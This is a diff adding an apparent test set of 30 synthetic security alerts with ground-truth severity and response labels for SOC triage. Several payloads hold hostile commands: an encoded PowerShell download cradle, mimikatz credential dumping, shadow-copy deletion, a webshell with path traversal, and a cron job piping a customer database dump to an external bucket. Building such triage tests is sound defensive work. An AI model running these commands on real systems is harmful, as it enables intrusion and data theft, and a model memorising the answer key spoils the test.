@@ -1,0 +1,422 @@
+[
+  {
+    "id": "ALT-001",
+    "timestamp": "2026-04-25T14:32:00Z",
+    "source_ip": "10.0.4.17",
+    "dest_ip": "185.220.101.42",
+    "hostname": "DC-FINANCE-01",
+    "rule_name": "Suspicious PowerShell Download Cradle",
+    "payload": "powershell.exe -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADIALwBwAGEAeQBsAG8AYQBkACcAKQApAA==",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-002",
+    "timestamp": "2026-04-25T09:15:00Z",
+    "source_ip": "10.0.2.50",
+    "dest_ip": "91.219.236.18",
+    "hostname": "DC-CORP-01",
+    "rule_name": "Credential Dumping - LSASS Memory Access",
+    "payload": "Process: mimikatz.exe | Command: sekurlsa::logonpasswords | Parent: cmd.exe | PID: 4892 | Target: lsass.exe (PID 672) | Access: 0x1010 (PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ)",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-003",
+    "timestamp": "2026-04-25T11:42:00Z",
+    "source_ip": "10.0.5.88",
+    "dest_ip": "45.33.32.156",
+    "hostname": "WS-HR-042",
+    "rule_name": "Lateral Movement - PsExec Remote Execution",
+    "payload": "psexec.exe \\\\10.0.2.50 -u admin -p [REDACTED] cmd.exe /c whoami && net group \"Domain Admins\" /domain | Targets: 10.0.2.50, 10.0.3.15, 10.0.4.17 | Service installed: PSEXESVC",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-004",
+    "timestamp": "2026-04-25T03:22:00Z",
+    "source_ip": "10.0.3.10",
+    "dest_ip": "198.51.100.77",
+    "hostname": "SRV-DB-01",
+    "rule_name": "Large Outbound Data Transfer to External IP",
+    "payload": "NetFlow: src=10.0.3.10:49152 dst=198.51.100.77:443 bytes_out=2147483648 duration=1847s proto=TLS1.2 | 2.0 GB transferred to external IP in off-hours | Normal daily avg: 50MB outbound",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-005",
+    "timestamp": "2026-04-25T06:48:00Z",
+    "source_ip": "10.0.6.22",
+    "dest_ip": "203.0.113.99",
+    "hostname": "SRV-FILE-01",
+    "rule_name": "Ransomware Precursor - Shadow Copy Deletion",
+    "payload": "cmd.exe /c vssadmin delete shadows /all /quiet && wmic shadowcopy delete && bcdedit /set {default} recoveryenabled No | Subsequently detected: mass file rename *.docx -> *.docx.locked (2,847 files in 3 minutes)",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-006",
+    "timestamp": "2026-04-25T15:10:00Z",
+    "source_ip": "10.0.5.42",
+    "dest_ip": "162.247.74.201",
+    "hostname": "WS-HR-042",
+    "rule_name": "Cobalt Strike Beacon - HTTP C2 Callback",
+    "payload": "GET /ca HTTP/1.1 Host: 162.247.74.201 Cookie: session=aGVsbG8gd29ybGQ= User-Agent: Mozilla/5.0 | Beacon interval: 60s jitter: 15% | Malleable C2 profile: jquery-c2.4.3.profile | Pipe: \\\\.\\pipe\\msagent_89",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-007",
+    "timestamp": "2026-04-25T10:05:00Z",
+    "source_ip": "10.0.7.33",
+    "dest_ip": "10.0.1.1",
+    "hostname": "WS-DEV-017",
+    "rule_name": "DNS Tunneling to Known Malicious Domain",
+    "payload": "DNS query: AAAAAABBBBBBCCCCCC.malware-update.darkhost.xyz TXT | Query rate: 847 queries/min to *.malware-update.darkhost.xyz | Average subdomain length: 45 chars | Encoded payload detected in subdomain labels",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-008",
+    "timestamp": "2026-04-25T02:14:00Z",
+    "source_ip": "23.129.64.100",
+    "dest_ip": "10.0.1.5",
+    "hostname": "VPN-GW-01",
+    "rule_name": "Brute Force Success - Multiple Failed Logins Followed by Auth",
+    "payload": "Auth log: 500 failed login attempts for user 'svc_backup' from 23.129.64.100 between 01:45-02:12 | Final successful auth at 02:14:03 from same IP | Account: svc_backup (service account) | MFA: not configured for service accounts",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-009",
+    "timestamp": "2026-04-25T16:30:00Z",
+    "source_ip": "104.248.52.31",
+    "dest_ip": "10.0.8.15",
+    "hostname": "SRV-WEB-01",
+    "rule_name": "Webshell Upload Detected on Web Server",
+    "payload": "POST /uploads/images/../cmd.aspx HTTP/1.1 | File written: /var/www/html/cmd.aspx (4.2KB) | Content match: eval(Request[\"cmd\"]) | Source: 104.248.52.31 | WAF bypass: path traversal via double encoding %252e%252e",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-010",
+    "timestamp": "2026-04-25T04:55:00Z",
+    "source_ip": "10.0.2.50",
+    "dest_ip": "10.0.2.1",
+    "hostname": "DC-CORP-01",
+    "rule_name": "Privilege Escalation - Service Account Added to Domain Admins",
+    "payload": "EventID 4728: Member added to security-enabled global group 'Domain Admins' | Subject: CORP\\svc_backup | Member: CORP\\svc_temp_admin | Logon ID: 0x3E7 | Time: 04:55:12 off-hours | No change ticket found in ServiceNow",
+    "ground_truth": {
+      "severity": "P1",
+      "is_malicious": true,
+      "expected_actions": ["isolate_host", "block_ioc", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-011",
+    "timestamp": "2026-04-25T10:00:00Z",
+    "source_ip": "10.0.9.5",
+    "dest_ip": "10.0.2.50",
+    "hostname": "DC-CORP-01",
+    "rule_name": "PowerShell Remoting - WinRM Session Detected",
+    "payload": "New-PSSession -ComputerName DC-CORP-01 -Credential (Get-Credential) | User: CORP\\admin_jsmith | Source: WS-IT-ADMIN (10.0.9.5) | Script: Deploy-WindowsPatches.ps1 | Scheduled maintenance window: Tue 10:00-12:00",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-012",
+    "timestamp": "2026-04-25T08:30:00Z",
+    "source_ip": "10.0.10.100",
+    "dest_ip": "10.0.0.0",
+    "hostname": "LAB-TEST-01",
+    "rule_name": "IDS Signature Match - Multiple Exploit Attempts",
+    "payload": "Nessus scan detected | Scanner IP: 10.0.10.100 | Signatures triggered: CVE-2024-1234, CVE-2025-5678, MS17-010 | Scan policy: Weekly-Vuln-Assessment | Scheduled: Fri 08:00 | Asset owner notified: YES",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-013",
+    "timestamp": "2026-04-25T12:15:00Z",
+    "source_ip": "10.0.7.33",
+    "dest_ip": "10.0.1.1",
+    "hostname": "WS-DEV-017",
+    "rule_name": "High DNS Query Volume - Possible Tunneling",
+    "payload": "DNS query spike: 1,247 queries in 5 minutes from WS-DEV-017 | Top domains: windowsupdate.microsoft.com (623), download.windowsupdate.com (412), ctldl.windowsupdate.com (212) | All queries to Microsoft Update CDN endpoints",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-014",
+    "timestamp": "2026-04-25T01:00:00Z",
+    "source_ip": "10.0.6.22",
+    "dest_ip": "52.218.170.80",
+    "hostname": "SRV-FILE-01",
+    "rule_name": "Large Outbound Data Transfer Detected",
+    "payload": "NetFlow: src=10.0.6.22:55123 dst=52.218.170.80:443 bytes_out=5368709120 duration=3600s proto=TLS1.3 | Destination: AWS S3 (s3.us-east-1.amazonaws.com) | Application: Veeam Backup Agent | Schedule: nightly 01:00",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-015",
+    "timestamp": "2026-04-25T14:00:00Z",
+    "source_ip": "10.0.10.200",
+    "dest_ip": "10.0.0.0",
+    "hostname": "LAB-TEST-01",
+    "rule_name": "Network Port Scan Detected - Multiple Hosts",
+    "payload": "Nmap scan: 10.0.10.200 -> 10.0.0.0/16 | Ports: 22,80,443,3389,445,8080 | Scan type: SYN | Authorized pentest: PT-2026-Q2-042 | Team: RedOps | Contact: security@corp.local | Window: Apr 25 13:00-17:00",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-016",
+    "timestamp": "2026-04-25T09:45:00Z",
+    "source_ip": "10.0.7.33",
+    "dest_ip": "104.18.32.7",
+    "hostname": "WS-DEV-017",
+    "rule_name": "Large Data Transfer - Possible Exfiltration",
+    "payload": "NetFlow: src=10.0.7.33:52341 dst=104.18.32.7:443 bytes_out=8589934592 duration=2400s | Destination: registry-1.docker.io (Docker Hub) | Process: docker pull | Images: nvidia/cuda:12.4-devel, python:3.12-slim, postgres:16",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-017",
+    "timestamp": "2026-04-25T11:20:00Z",
+    "source_ip": "10.0.5.88",
+    "dest_ip": "connectwise.corp.local",
+    "hostname": "WS-HR-042",
+    "rule_name": "Remote Access Tool - Unauthorized Application",
+    "payload": "Process: ConnectWiseControl.Client.exe | Publisher: ConnectWise Inc (verified) | Connection: relay.screenconnect.com:443 | User: helpdesk_mwilson | Session: Remote support ticket HD-2026-4819 | Approved tool list: YES",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-018",
+    "timestamp": "2026-04-25T07:30:00Z",
+    "source_ip": "10.0.9.10",
+    "dest_ip": "10.0.0.0",
+    "hostname": "SRV-FILE-01",
+    "rule_name": "Lateral Movement - SMB Admin Share Access from Multiple Sources",
+    "payload": "SMB connections to \\\\SRV-FILE-01\\ADMIN$ from: 10.0.9.10, 10.0.9.11, 10.0.9.12 | User: CORP\\sccm_push | Process: CcmExec.exe | Application: SCCM Client Push Installation | Task: KB5035853 deployment",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-019",
+    "timestamp": "2026-04-25T13:00:00Z",
+    "source_ip": "10.0.5.99",
+    "dest_ip": "smtp.office365.com",
+    "hostname": "WS-MKTG-003",
+    "rule_name": "Email Exfiltration - Bulk Outbound Email with Attachments",
+    "payload": "SMTP: 2,500 emails sent in 30 minutes from marketing@corp.com | Average attachment size: 1.2MB | Destination: external recipients | Application: Mailchimp Desktop | Campaign: Q2-Product-Launch-Newsletter | Approved: YES",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-020",
+    "timestamp": "2026-04-25T15:45:00Z",
+    "source_ip": "10.0.8.15",
+    "dest_ip": "10.0.8.15",
+    "hostname": "SRV-WEB-01",
+    "rule_name": "Unusual Process Tree - Suspicious Child Process Spawning",
+    "payload": "Process tree: services.exe -> CrowdStrikeInstaller.exe -> CSFalconService.exe -> csagent.exe | New service registered: CrowdStrike Falcon Sensor | Installer hash: SHA256:abc123... (signed by CrowdStrike Inc) | Change ticket: CHG-2026-1847",
+    "ground_truth": {
+      "severity": "P4",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-021",
+    "timestamp": "2026-04-25T22:30:00Z",
+    "source_ip": "10.0.11.55",
+    "dest_ip": "10.0.4.17",
+    "hostname": "DC-FINANCE-01",
+    "rule_name": "After-Hours RDP Login from Unknown Internal IP",
+    "payload": "EventID 4624: Logon Type 10 (RemoteInteractive) | User: CORP\\jdoe_finance | Source: 10.0.11.55 (no hostname resolved) | Time: 22:30 (outside business hours 08:00-18:00) | User's normal workstation: WS-FIN-015 (10.0.4.22) | MFA: passed",
+    "ground_truth": {
+      "severity": "P2",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-022",
+    "timestamp": "2026-04-25T16:45:00Z",
+    "source_ip": "10.0.12.88",
+    "dest_ip": "onedrive.live.com",
+    "hostname": "WS-ENG-PC-034",
+    "rule_name": "Large File Upload to Personal Cloud Storage",
+    "payload": "HTTPS upload: 10.0.12.88 -> onedrive.live.com | bytes_out=3221225472 (3GB) | Duration: 1200s | User: CORP\\asmith_eng | Files: project-*.zip, design-docs-*.pdf | Personal OneDrive (not corporate OneDrive for Business)",
+    "ground_truth": {
+      "severity": "P2",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-023",
+    "timestamp": "2026-04-25T02:15:00Z",
+    "source_ip": "10.0.2.50",
+    "dest_ip": "10.0.2.1",
+    "hostname": "DC-CORP-01",
+    "rule_name": "New Service Account Created Outside Change Window",
+    "payload": "EventID 4720: User account created | Account: CORP\\svc_analytics_temp | Created by: CORP\\admin_dbrown | Time: 02:15 (outside change window) | No matching ServiceNow change ticket | Account added to: Remote Desktop Users, Backup Operators",
+    "ground_truth": {
+      "severity": "P2",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-024",
+    "timestamp": "2026-04-25T13:30:00Z",
+    "source_ip": "10.0.3.10",
+    "dest_ip": "10.0.3.10",
+    "hostname": "SRV-DB-01",
+    "rule_name": "PowerShell Execution on Non-Standard Server",
+    "payload": "powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\export-data.ps1 | User: CORP\\svc_db | Server: SRV-DB-01 (database server, PS not in baseline) | Script content: Invoke-Sqlcmd, Export-Csv, Compress-Archive | Output: C:\\temp\\export.zip (450MB)",
+    "ground_truth": {
+      "severity": "P3",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-025",
+    "timestamp": "2026-04-25T18:20:00Z",
+    "source_ip": "10.0.5.42",
+    "dest_ip": "176.32.98.166",
+    "hostname": "WS-HR-042",
+    "rule_name": "Outbound Connection to Unusual Geolocation",
+    "payload": "HTTPS: 10.0.5.42 -> 176.32.98.166:443 | GeoIP: Belize | Company operations: US, UK, Germany only | Duration: 45min | bytes_out: 125MB | SNI: storage.bz-cloud.net | No prior connections to this IP from corporate network",
+    "ground_truth": {
+      "severity": "P2",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-026",
+    "timestamp": "2026-04-25T09:00:00Z",
+    "source_ip": "10.0.6.22",
+    "dest_ip": "10.0.6.22",
+    "hostname": "SRV-FILE-01",
+    "rule_name": "USB Mass Storage Device Connected to Server",
+    "payload": "EventID 6416: New external device recognized | Device: USB Mass Storage | Vendor: SanDisk | Product: Ultra USB 3.0 | Serial: 4C530001120405121345 | Location: SRV-FILE-01 (server room rack B3) | USB policy: block on servers | Device allowed: override by local admin",
+    "ground_truth": {
+      "severity": "P3",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-027",
+    "timestamp": "2026-04-25T20:10:00Z",
+    "source_ip": "10.0.13.77",
+    "dest_ip": "10.0.3.15",
+    "hostname": "SRV-DB-01",
+    "rule_name": "Multiple Failed SSH Attempts from Contractor VPN",
+    "payload": "SSH auth failures: 47 attempts in 10 minutes | Source: 10.0.13.77 (contractor VPN pool) | Target: SRV-DB-01:22 | User: root (15), postgres (12), admin (10), ubuntu (10) | Contractor: Acme Consulting (active SOW) | No successful auth",
+    "ground_truth": {
+      "severity": "P2",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket", "escalate"]
+    }
+  },
+  {
+    "id": "ALT-028",
+    "timestamp": "2026-04-25T07:00:00Z",
+    "source_ip": "10.0.14.5",
+    "dest_ip": "54.192.0.0",
+    "hostname": "IOT-PRINTER-05",
+    "rule_name": "Unusual Outbound HTTPS Traffic from IoT Device",
+    "payload": "HTTPS: 10.0.14.5 -> multiple external IPs | bytes_out: 892MB in 24h | Normal baseline: <5MB/day | Destinations: CloudFront CDN IPs | User-Agent: PrinterOS/3.2 | IoT-PRINTER-05 firmware updated yesterday | New telemetry feature enabled by default",
+    "ground_truth": {
+      "severity": "P3",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-029",
+    "timestamp": "2026-04-25T11:55:00Z",
+    "source_ip": "10.0.15.22",
+    "dest_ip": "10.0.15.22",
+    "hostname": "WS-INTERN-009",
+    "rule_name": "TOR Browser Installation Detected",
+    "payload": "Process: torbrowser-install-win64-13.0.1_ALL.exe | Source: torproject.org (HTTPS) | User: CORP\\intern_klee | Installation path: C:\\Users\\intern_klee\\Desktop\\Tor Browser\\ | tor.exe spawned after install | Network: SOCKS proxy on 127.0.0.1:9150",
+    "ground_truth": {
+      "severity": "P3",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket"]
+    }
+  },
+  {
+    "id": "ALT-030",
+    "timestamp": "2026-04-25T03:45:00Z",
+    "source_ip": "10.0.3.15",
+    "dest_ip": "10.0.3.15",
+    "hostname": "SRV-DB-01",
+    "rule_name": "Unexpected Cron Job Added to Production Server",
+    "payload": "New crontab entry: */5 * * * * /tmp/.data_sync.sh | User: postgres | Script content: pg_dump customer_db | gzip | curl -X PUT https://unknown-backup.s3.amazonaws.com/$(date +%s).gz | Script created: 03:40 | No change ticket | File permissions: 755",
+    "ground_truth": {
+      "severity": "P2",
+      "is_malicious": false,
+      "expected_actions": ["create_ticket", "escalate"]
+    }
+  }
+]
